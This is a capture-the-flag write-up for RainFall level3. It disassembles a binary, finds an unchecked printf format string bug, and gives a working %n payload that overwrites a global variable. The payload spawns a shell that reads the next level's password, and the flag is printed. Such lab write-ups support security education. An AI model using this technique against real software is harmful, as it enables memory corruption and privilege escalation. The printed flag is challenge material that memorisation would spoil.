# **Level3**

In this level, we found a binary that takes input and prints it:

```bash
level3@RainFall:~$ ./level3
qww
qww
level3@RainFall:~$
```

## **Binary Analysis**

Using GDB, we analyzed the binary and found that the `main` function simply calls the function v:

```bash
(gdb) disas main
Dump of assembler code for function main:
0x0804851a <+0>:	push   %ebp
0x0804851b <+1>:	mov    %esp,%ebp
0x0804851d <+3>:	and    $0xfffffff0,%esp
0x08048520 <+6>:	call   0x80484a4 <v>
0x08048525 <+11>:	leave
0x08048526 <+12>:	ret
End of assembler dump.
(gdb)
```

Analyzing the `v` function reveals that the program uses **`fgets`** to read input into a buffer, which is then passed directly to **`printf()`**. The function also compares a global variable, **`m`** (located at **`0x804988c`**), with **`0x40`** (64). If the comparison succeeds, it calls **`system`**.

```nasm
(gdb) disas v
Dump of assembler code for function v:
0x080484a4 <+0>:	push   %ebp
0x080484a5 <+1>:	mov    %esp,%ebp  ; Allocate 536 bytes on stack
0x080484a7 <+3>:	sub    $0x218,%esp
0x080484ad <+9>:	mov    0x8049860,%eax
0x080484b2 <+14>:	mov    %eax,0x8(%esp)
0x080484b6 <+18>:	movl   $0x200,0x4(%esp) ; Size = 512
0x080484be <+26>:	lea    -0x208(%ebp),%eax  ; Buffer address
0x080484c4 <+32>:	mov    %eax,(%esp)
0x080484c7 <+35>:	call   0x80483a0 [fgets@plt](mailto:fgets@plt)
0x080484cc <+40>:	lea    -0x208(%ebp),%eax
0x080484d2 <+46>:	mov    %eax,(%esp)
0x080484d5 <+49>:	call   0x8048390 [printf@plt](mailto:printf@plt)
0x080484da <+54>:	mov    0x804988c,%eax ; Load value of 'm'
0x080484df <+59>:	cmp    $0x40,%eax ; Compare with 64
0x080484e2 <+62>:	jne    0x8048518 <v+116> ; Jump if not equal
0x080484e4 <+64>:	mov    0x8049880,%eax
0x080484e9 <+69>:	mov    %eax,%edx
0x080484eb <+71>:	mov    $0x8048600,%eax
0x080484f0 <+76>:	mov    %edx,0xc(%esp)
0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
0x080484fc <+88>:	movl   $0x1,0x4(%esp)
0x08048504 <+96>:	mov    %eax,(%esp)
0x08048507 <+99>:	call   0x80483b0 [fwrite@plt](mailto:fwrite@plt)
0x0804850c <+104>:	movl   $0x804860d,(%esp)
0x08048513 <+111>:	call   0x80483c0 [system@plt](mailto:system@plt)
0x08048518 <+116>:	leave
0x08048519 <+117>:	ret
End of assembler dump.
(gdb)
```

**Format String Analysis**

```nasm
level3@RainFall:~$ ./level3
AAAAAA %x %x %x %x %x %x %x
AAAAAA 200 b7fd1ac0 b7ff37d0 41414141 25204141 78252078 20782520
level3@RainFall:~$
```

- Our input (`AAAAAA`) starts appearing at the 4th stack position.
- The stack contents show memory addresses and input fragments in hexadecimal:
    - **`200`**: Likely the buffer size (512 in decimal).
    - **`b7fd1ac0`**, **`b7ff37d0`**: libc addresses.
    - **`41414141`**: ASCII representation of `AAAA`.

## **Vulnerability**

The vulnerability lies in the unsafe use of **`printf()`**, where user input is passed directly without a format specifier. This enables a **format string attack**, allowing us to read and write arbitrary memory. Our objective is to modify the value of **`m`** (at **`0x804988c`**) to **`0x40`** (64).

## **Exploit**

We can use the format string vulnerability to write to the memory location of **`m`**. the **`%n`** format specifier writes the number of characters printed so far to the provided address.

Since we found that our input appears at the 4th position, we can create a more precise exploit:

1. We need to write **`0x40`** (64) to the address **`0x804988c`**
2. We can use **`%4$n`** to write to the 4th parameter
3. We need to ensure exactly 64 characters are printed before the **`%n`**

```python
# Target address (0x804988c in little-endian)
address = "\x8c\x98\x04\x08" 

# Padding to reach count of 64 bytes
padding = "y" * 60

# Write to 4th parameter using %n
write = "%4$n"

# Final exploit
exploit = address + padding + write # address(4 bytes) + padding (60)
```

1. Create exploit file

```bash
(python -c 'print "\x8c\x98\x04\x08" + "y" * 60 + "%4$n"'; cat) | ./level3
```

1. Result

```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "y" * 60 + "%4$n"'; cat) | ./level3
�yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

```

## Flag

```bash
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
